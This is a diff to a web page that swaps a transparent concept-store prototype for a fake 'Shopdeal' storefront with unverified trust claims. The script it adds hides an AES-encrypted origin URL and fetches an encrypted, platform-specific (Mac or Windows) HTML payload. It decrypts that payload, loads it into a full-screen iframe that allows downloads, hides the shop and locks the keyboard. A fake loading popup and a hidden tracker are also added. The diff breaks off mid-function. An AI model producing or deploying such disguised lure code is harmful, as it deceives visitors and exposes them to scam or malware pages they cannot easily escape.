+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
   </style>
+
+
 </head>
 <body>
-  <a class="skip" href="#main">Skip to content</a>
-  <div class="announcement">A CONCEPT PRODUCT SHOWCASE <span aria-hidden="true">✦</span> BUILT FOR WHAT'S NEXT</div>
-  <header class="site-header">
-    <div class="nav-wrap">
-      <a class="brand" href="#home" aria-label="NOVA STYLE home"><span class="brand-mark" aria-hidden="true">N</span><span>NOVA<span style="color:var(--cyan)">/</span>STYLE</span></a>
-      <nav class="nav-links" id="mainNav" aria-label="Main navigation">
-        <a href="#products">Discover</a><a href="#approach">Our approach</a><a href="#benefits">Why NOVA STYLE</a><a href="#faq">FAQ</a><a href="#contact">Contact</a>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
+
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
       </nav>
-      <a class="nav-cta" href="#products">Explore collection <span aria-hidden="true">↗</span></a>
-      <button class="theme-toggle" id="themeToggle" type="button" aria-label="Switch to light mode" aria-pressed="true"><span class="theme-toggle-icon" id="themeIcon" aria-hidden="true">☀</span><span id="themeLabel">Light mode</span></button>
-      <button class="menu-btn" id="menuToggle" type="button" aria-label="Toggle navigation" aria-expanded="false" aria-controls="mainNav">☰</button>
-    </div>
-  </header>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <main id="main">
-    <section class="hero" id="home" aria-labelledby="heroTitle">
-      <div class="hero-grid">
-        <div class="hero-copy">
-          <span class="eyebrow">Style meets everyday life</span>
-          <h1 id="heroTitle">Discover<br>what's <span class="gradient-text">next.</span></h1>
-          <p>A curated fashion and lifestyle showroom for expressive style, useful accessories, and considered everyday living. Explore the collection and find the details that matter to you.</p>
-          <div class="hero-actions"><a class="button" href="#products">Explore the collection <span aria-hidden="true">↗</span></a><a class="button button-secondary" href="#approach">Our point of view</a></div>
-          <div class="micro-trust"><span>Design-led concepts</span><span>Curated discovery</span><span>Made to explore</span></div>
-        </div>
-        <div class="hero-visual" aria-label="Fashion editorial artwork">
-          <div class="orbit" aria-hidden="true"></div>
-          <img class="hero-image" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?auto=format&fit=crop&w=1000&q=85" alt="Fashion editorial portrait showing a contemporary outfit" width="1000" height="1200" fetchpriority="high">
-          <div class="float-card float-one"><strong><span class="signal"></span>Future-facing design</strong><small>Style for everyday life</small></div>
-          <div class="float-card float-two"><strong>Curiosity, curated.</strong><small>Explore a new perspective ↗</small></div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
       </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
     </section>
 
-    <div class="ticker" aria-label="Showcase themes"><div class="ticker-inner"><span>◈ Style discovery</span><span>✳ Considered details</span><span>⌁ Everyday essentials</span><span>◎ Personal expression</span></div></div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-    <section class="section container" id="products" aria-labelledby="productsTitle">
-      <div class="section-head"><div><span class="eyebrow">The curated edit</span><h2 id="productsTitle">Find your next favorite.</h2></div><p>Browse illustrative fashion and lifestyle concepts. This is a design prototype, not a live store; products, specifications, and prices are examples only.</p></div>
-      <div class="product-tools">
-        <label class="search-wrap"><span aria-hidden="true">⌕</span><input id="productSearch" type="search" placeholder="Search concepts…" aria-label="Search fashion and lifestyle finds"></label>
-        <button class="filter-btn active" type="button" data-filter="All" aria-pressed="true">All concepts</button>
-        <button class="filter-btn" type="button" data-filter="Fashion" aria-pressed="false">Fashion</button>
-        <button class="filter-btn" type="button" data-filter="Accessories" aria-pressed="false">Accessories</button>
-        <button class="filter-btn" type="button" data-filter="Living" aria-pressed="false">Home &amp; living</button>
-        <label for="sortProducts" class="sr-only" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)">Sort concepts</label>
-        <select class="sort-select" id="sortProducts" aria-label="Sort concepts"><option value="featured">Featured</option><option value="low">Illustrative price: low to high</option><option value="high">Illustrative price: high to low</option><option value="name">Name: A to Z</option></select>
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
-      <div class="product-grid" id="productGrid" aria-live="polite"></div>
-    </section>
-
-    <section class="section container" id="approach" aria-labelledby="approachTitle">
-      <div class="manifesto">
-        <div class="manifesto-art" aria-hidden="true"><div class="cube"></div></div>
-        <div class="manifesto-copy"><span class="eyebrow">A working philosophy</span><h2 id="approachTitle">Less noise.<br><span class="gradient-text">More meaning.</span></h2><p>Great products should solve a real problem, feel intuitive to use, and earn their place in everyday life. NOVA STYLE is a concept for presenting products with clarity instead of clutter.</p><div class="manifesto-points"><div><strong>Purpose first</strong><small>Explain what it does and why it matters.</small></div><div><strong>Details matter</strong><small>Make features and trade-offs easy to understand.</small></div><div><strong>Design with intent</strong><small>Visual style should support usability.</small></div><div><strong>Stay transparent</strong><small>Show verified information, not invented claims.</small></div></div></div>
-      </div>
-    </section>
-
-    <section class="section container" id="benefits" aria-labelledby="benefitsTitle">
-      <div class="section-head"><div><span class="eyebrow">The experience</span><h2 id="benefitsTitle">A clearer way to discover.</h2></div><p>The final live store should replace these concept principles with specific, verifiable benefits for its chosen product category.</p></div>
-      <div class="benefit-grid">
-        <article class="benefit"><div class="benefit-icon" aria-hidden="true">⌕</div><h3>Find the right fit</h3><p>Search and filters help visitors narrow a collection and focus on relevant options.</p></article>
-        <article class="benefit"><div class="benefit-icon" aria-hidden="true">◇</div><h3>Understand the details</h3><p>Product descriptions should clearly explain uses, important features, and limitations.</p></article>
-        <article class="benefit"><div class="benefit-icon" aria-hidden="true">↗</div><h3>Take the next step</h3><p>Give visitors a straightforward way to ask questions or continue to a verified product destination.</p></article>
-      </div>
-    </section>
-
-
-  </main>
-
-
-  <section class="content-page" id="shipping" aria-labelledby="shippingTitle">
-    <div class="container"><div class="content-page-inner">
-      <span class="eyebrow">Customer care</span><h2 id="shippingTitle">Shipping information</h2>
-      <p>NOVA STYLE is currently a product showcase prototype and does not dispatch orders. Before launch, this page must explain the destinations served, order processing times, delivery estimates, shipping costs, carriers, and tracking options.</p>
-      <h3>Before placing an order</h3><ul><li>Review shipping costs and estimated delivery windows before payment.</li><li>Check that your delivery address is complete and accurate.</li><li>International deliveries may involve customs duties or taxes depending on the destination and applicable law.</li></ul>
-      <h3>Tracking and delays</h3><p>For a live store, explain how tracking details are shared and how customers can ask for help with delayed shipments.</p>
-      <p class="updated-note">Template only — replace with the real shipping policy before accepting orders.</p>
-    </div></div>
-  </section>
-  <section class="content-page" id="returns" aria-labelledby="returnsTitle">
-    <div class="container"><div class="content-page-inner">
-      <span class="eyebrow">Customer care</span><h2 id="returnsTitle">Returns &amp; exchanges</h2>
-      <p>NOVA STYLE does not currently sell or ship products through this prototype. The live policy must reflect the products sold, the markets served, and applicable consumer-protection requirements.</p>
-      <h3>Before requesting a return</h3><ul><li>Keep your order confirmation and relevant product packaging.</li><li>Check the final policy for eligibility, return windows, product condition, exclusions, and return-shipping responsibility.</li><li>For damaged or incorrect items, provide order details and contact the verified support channel.</li></ul>
-      <h3>Refunds and exchanges</h3><p>Publish the real refund method, exchange availability, and expected processing timeline before launch.</p>
-      <p class="updated-note">Template only — this is not legal advice and does not establish a specific return entitlement or deadline.</p>
-    </div></div>
-  </section>
-  <section class="content-page" id="contact" aria-labelledby="contactTitle">
-    <div class="container"><div class="content-page-inner">
-      <span class="eyebrow">Start a conversation</span><h2 id="contactTitle">Contact NOVA STYLE</h2>
-      <p>Have a question about a product, collaboration, or the collection? This enquiry form is a preview only. It does not send or store messages until a secure form endpoint is connected.</p>
-      <form class="contact-form standalone-contact-form" id="contactForm">
-        <div class="field"><label for="contactName">Your name</label><input id="contactName" name="name" autocomplete="name" required maxlength="100" placeholder="Name"></div>
-        <div class="field"><label for="contactEmail">Email address</label><input id="contactEmail" name="email" type="email" autocomplete="email" required maxlength="200" placeholder="you@example.com"></div>
-        <div class="field full"><label for="contactTopic">What is this about?</label><select id="contactTopic" name="topic"><option>Product enquiry</option><option>Partnership</option><option>Press or media</option><option>General question</option></select></div>
-        <div class="field full"><label for="contactMessage">Your message</label><textarea id="contactMessage" name="message" required maxlength="3000" placeholder="Tell us what you'd like to know…"></textarea></div>
-        <div class="field full"><button class="button" type="submit">Preview enquiry ↗</button></div>
-        <p class="form-status" id="formStatus" role="status" aria-live="polite"></p>
-      </form>
-      <p class="updated-note">Add verified business contact details before launch.</p>
-    </div></div>
-  </section>
-  <section class="content-page" id="faq" aria-labelledby="faqTitle">
-    <div class="container"><div class="content-page-inner">
-      <span class="eyebrow">Quick answers</span><h2 id="faqTitle">Frequently asked questions</h2>
-      <div class="faq-list">
-        <details><summary>Is NOVA STYLE a live store?</summary><p>No. NOVA STYLE is a provisional brand concept for this website prototype. No actual business or inventory has been confirmed.</p></details>
-        <details><summary>Are the products and prices real?</summary><p>No. Product names, descriptions, images, and example prices are illustrative placeholders and are not offers for sale.</p></details>
-        <details><summary>Can I purchase a product here?</summary><p>No. Payment processing, inventory, shipping, and checkout are not connected. This website is intended to showcase products and collect enquiries after a real form endpoint is connected.</p></details>
-        <details><summary>How can I contact NOVA STYLE?</summary><p>Use the contact page to preview the enquiry experience. Message delivery must be connected before launch.</p></details>
-      </div>
-      <p class="updated-note">Prototype FAQ — update these answers to match the real business before launch.</p>
-    </div></div>
-  </section>
-  <section class="content-page" id="privacy" aria-labelledby="privacyTitle">
-    <div class="container"><div class="content-page-inner">
-      <span class="eyebrow">Site information</span><h2 id="privacyTitle">Privacy policy</h2>
-      <p>This is a planning template, not a complete legal privacy notice. The live policy must identify the responsible business, data collected, purposes, retention periods, service providers, applicable user rights, and contact details.</p>
-      <h3>Information and purpose</h3><p>Only collect information needed for clearly explained purposes. The contact form on this prototype does not send or store submitted information.</p>
-      <h3>Cookies, analytics and marketing</h3><p>Disclose the analytics, advertising, cookies, and marketing services actually used, and implement applicable consent or opt-out requirements.</p>
-      <h3>Your choices</h3><p>Explain how visitors can exercise applicable privacy rights and contact the responsible business.</p>
-      <p class="updated-note">Privacy template — replace with a reviewed policy based on the actual business, services, and markets.</p>
-    </div></div>
-  </section>
-  <section class="content-page" id="terms" aria-labelledby="termsTitle">
-    <div class="container"><div class="content-page-inner">
-      <span class="eyebrow">Site information</span><h2 id="termsTitle">Terms of service</h2>
-      <p>This website is a product showcase prototype. It does not accept orders, process payments, or create a purchase contract.</p>
-      <h3>Product information</h3><p>Product names, images, descriptions, and example prices are illustrative and must not be treated as verified offers or confirmed inventory.</p>
-      <h3>Live store terms</h3><p>Before launch, publish terms covering the actual business identity, product details, prices and taxes, order acceptance, payment, delivery, returns, warranties where applicable, acceptable use, dispute resolution, and governing law.</p>
-      <h3>Updates and contact</h3><p>Include an effective date, explain how material changes are communicated, and provide verified business contact details.</p>
-      <p class="updated-note">Terms template — not legal advice and not a substitute for terms reviewed for the real business and target markets.</p>
-    </div></div>
-  </section>
-
-  <footer>
-    <div class="footer-main">
-      <div class="footer-intro"><a class="brand" href="#home"><span class="brand-mark" aria-hidden="true">N</span><span>NOVA<span style="color:var(--cyan)">/</span>STYLE</span></a><p>A provisional product showcase concept exploring modern design, useful innovation, and clearer product discovery.</p></div>
-      <div class="footer-col"><h3>Explore</h3><nav class="footer-links" aria-label="Footer explore links"><a href="#products">Product showcase</a><a href="#approach">Our approach</a><a href="#faq">Frequently asked questions</a><a href="#contact">Contact NOVA STYLE</a></nav></div>
-      <div class="footer-col"><h3>Customer care</h3><nav class="footer-links" aria-label="Footer customer care links"><a href="#shipping">Shipping information</a><a href="#returns">Returns &amp; exchanges</a><a href="#privacy">Privacy policy</a><a href="#terms">Terms of service</a></nav><p style="font-size:.76rem;color:#7783a3">Prototype policies must be finalized before launch.</p></div>
     </div>
-    <div class="footer-bottom"><span>© <span id="year"></span> NOVA STYLE concept. All rights reserved.</span><span>Prototype only · No live sales or message delivery</span></div>
-  </footer>
 
-  <div class="modal-backdrop" id="productModal" role="presentation">
-    <section class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDescription">
-      <div class="modal-head"><h2 id="modalTitle">Product concept</h2><button class="close-modal" id="closeModal" type="button" aria-label="Close product details">✕</button></div>
-      <img id="modalImage" src="" alt="" width="900" height="600">
-      <div class="product-category" id="modalCategory"></div>
-      <p id="modalDescription"></p>
-      <div class="notice">Concept preview only. Product details, availability, and illustrative prices must be verified before commercial use.</div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
     </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
 
   <script>
-    "use strict";
-    const products = [
-      {id:1,name:"Everyday Carry Tote",category:"Accessories",price:38,tag:"Everyday favorite",description:"A versatile tote concept for carrying daily essentials. A live listing should confirm dimensions, material, care instructions, and what is included.",image:"https://images.unsplash.com/photo-1544816155-12df9643f363?auto=format&fit=crop&w=900&q=82"},
-      {id:2,name:"The Weekend Layer",category:"Fashion",price:68,tag:"Style edit",description:"A relaxed layering concept for everyday outfits. Confirm fabric composition, fit, available sizes, care instructions, and stock before launch.",image:"https://images.unsplash.com/photo-1529139574466-a303027c1d8b?auto=format&fit=crop&w=900&q=82"},
-      {id:3,name:"Sculptural Everyday Vase",category:"Living",price:32,tag:"Home edit",description:"A decorative home concept for adding shape and character to a space. A real listing should include dimensions, material, and care guidance.",image:"https://images.unsplash.com/photo-1578500494198-246f612d3b3d?auto=format&fit=crop&w=900&q=82"},
-      {id:4,name:"Color Pop Crossbody",category:"Accessories",price:45,tag:"Fresh pick",description:"A compact bag concept for everyday plans. Confirm size, strap details, materials, storage capacity, and available colors before selling.",image:"https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=900&q=82"},
-      {id:5,name:"Relaxed Daily Shirt",category:"Fashion",price:49,tag:"Easy favorite",description:"A wardrobe staple concept. A live product page should provide accurate sizing, fabric details, fit notes, care instructions, and availability.",image:"https://images.unsplash.com/photo-1598033129183-c4f50c736f10?auto=format&fit=crop&w=900&q=82"},
-      {id:6,name:"Soft Shape Cushion",category:"Living",price:28,tag:"Living edit",description:"A soft furnishing concept for a considered home. Confirm dimensions, fabric, filling, care instructions, and color options before launch.",image:"https://images.unsplash.com/photo-1584100936595-c0654b55a2e2?auto=format&fit=crop&w=900&q=82"}
-    ];
-    const state = {filter:"All",search:"",sort:"featured"};
-    const $ = (selector,root=document)=>root.querySelector(selector);
-    const $$ = (selector,root=document)=>Array.from(root.querySelectorAll(selector));
-    const themeToggle = $("#themeToggle");
-    const themeIcon = $("#themeIcon");
-    const themeLabel = $("#themeLabel");
-    function applyTheme(theme, persist=true){
-      const normalized = theme === "light" ? "light" : "dark";
-      document.documentElement.dataset.theme = normalized;
-      const isDark = normalized === "dark";
-      themeToggle.setAttribute("aria-pressed", String(isDark));
-      themeToggle.setAttribute("aria-label", isDark ? "Switch to light mode" : "Switch to dark mode");
-      themeIcon.textContent = isDark ? "☀" : "☾";
-      themeLabel.textContent = isDark ? "Light mode" : "Dark mode";
-      const themeColor = document.querySelector('meta[name="theme-color"]');
-      if(themeColor) themeColor.content = isDark ? "#080b16" : "#f7f8fc";
-      if(persist){try{localStorage.setItem("nova-style-theme", normalized);}catch(_){}}
-    }
-    applyTheme(document.documentElement.dataset.theme || "dark", false);
-    themeToggle.addEventListener("click",()=>applyTheme(document.documentElement.dataset.theme === "dark" ? "light" : "dark"));
-    const money = value => new Intl.NumberFormat("en-US",{style:"currency",currency:"USD",maximumFractionDigits:0}).format(value);
-    const safeText = value => String(value).replace(/[&<>"']/g, char=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[char]));
-    const productGrid = $("#productGrid");
-    function visibleProducts(){
-      let list=products.filter(p=>(state.filter==="All"||p.category===state.filter)&&(p.name+" "+p.category+" "+p.description).toLowerCase().includes(state.search.toLowerCase()));
-      if(state.sort==="low")list.sort((a,b)=>a.price-b.price);
-      if(state.sort==="high")list.sort((a,b)=>b.price-a.price);
-      if(state.sort==="name")list.sort((a,b)=>a.name.localeCompare(b.name));
-      return list;
-    }
-    function renderProducts(){
-      const list=visibleProducts();
-      if(!list.length){productGrid.innerHTML='<div class="empty-state"><strong>No concepts found.</strong><br>Try a different search or category.</div>';return;}
-      productGrid.innerHTML=list.map(p=>`<article class="product-card"><div class="product-image-wrap"><img class="product-image" src="${safeText(p.image)}" alt="${safeText(p.name)} product image" width="900" height="720" loading="lazy"><span class="product-tag">${safeText(p.tag)}</span></div><div class="product-body"><div class="product-category">${safeText(p.category)}</div><div class="product-title-row"><h3>${safeText(p.name)}</h3><span class="product-price">${money(p.price)}*</span></div><p>${safeText(p.description)}</p><div class="product-actions"><button class="button button-secondary" type="button" data-details="${p.id}">View details ↗</button></div></div></article>`).join("");
-    }
-    function setFilter(filter){
-      state.filter=filter;
-      $$(".filter-btn").forEach(b=>{const active=b.dataset.filter===filter;b.classList.toggle("active",active);b.setAttribute("aria-pressed",String(active));});
-      renderProducts();
-    }
-    productGrid.addEventListener("click",event=>{
-      const button=event.target.closest("[data-details]");
-      if(!button)return;
-      const p=products.find(item=>item.id===Number(button.dataset.details));
-      if(!p)return;
-      $("#modalTitle").textContent=p.name;
-      $("#modalCategory").textContent=p.category+" · "+money(p.price)+" illustrative price";
-      $("#modalDescription").textContent=p.description;
-      $("#modalImage").src=p.image;
-      $("#modalImage").alt=p.name+" product image";
-      $("#productModal").classList.add("open");
-      $("#closeModal").focus();
-    });
-    function closeModal(){$("#productModal").classList.remove("open");}
-    $("#closeModal").addEventListener("click",closeModal);
-    $("#productModal").addEventListener("click",event=>{if(event.target===$("#productModal"))closeModal();});
-    document.addEventListener("keydown",event=>{if(event.key==="Escape")closeModal();});
-    $$(".filter-btn").forEach(b=>b.addEventListener("click",()=>setFilter(b.dataset.filter)));
-    $("#productSearch").addEventListener("input",event=>{state.search=event.target.value;renderProducts();});
-    $("#sortProducts").addEventListener("change",event=>{state.sort=event.target.value;renderProducts();});
-    $("#menuToggle").addEventListener("click",()=>{
-      const open=$("#mainNav").classList.toggle("open");
-      $("#menuToggle").setAttribute("aria-expanded",String(open));
-    });
-    $("#mainNav").addEventListener("click",event=>{
-      if(event.target.closest("a")){$("#mainNav").classList.remove("open");$("#menuToggle").setAttribute("aria-expanded","false");}
-    });
-    $("#contactForm").addEventListener("submit",event=>{
-      event.preventDefault();
-      if(!event.currentTarget.reportValidity())return;
-      $("#formStatus").textContent="Preview only: no message was sent or stored. Connect a real form endpoint before launch.";
-    });
-    $("#year").textContent=new Date().getFullYear();
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+BE8fIjkUsT6qhC2riQdWUfh0/hCP2pyCBUkC0sSd5zGVSdRyAr3ugiYbu6BjhLNhwwQtnolQBmg==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-    const pageSections = $$(".content-page");
-    const baseTitle = "NOVA STYLE — Discover What's Next";
-    function renderPageRoute(){
-      const route = window.location.hash.slice(1);
-      const target = pageSections.find(section => section.id === route);
-      pageSections.forEach(section => section.classList.toggle("page-active", section === target));
-      document.body.classList.toggle("page-mode", Boolean(target));
-      if(target){
-        document.title = (target.querySelector("h2")?.textContent || "Information") + " | NOVA STYLE";
-        window.scrollTo({top:0,behavior:matchMedia("(prefers-reduced-motion: reduce)").matches?"auto":"smooth"});
-      } else {
-        document.title = baseTitle;
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
       }
     }
-    window.addEventListener("hashchange",renderPageRoute);
-    renderPageRoute();
-    renderProducts();
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
